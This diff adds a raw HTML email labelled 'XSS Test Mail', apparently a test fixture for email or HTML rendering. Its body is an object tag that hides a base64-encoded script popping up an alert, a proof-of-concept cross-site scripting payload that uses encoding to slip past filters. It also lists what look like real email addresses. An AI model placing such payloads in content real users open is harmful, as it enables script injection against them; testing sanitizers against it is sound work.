@@ -1,0 +1,7 @@
+From: lilly_osu@provalue.net
+To: tomb@crossborderenergy.com, rochmanm@spurr.org, bcherry@sempra.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
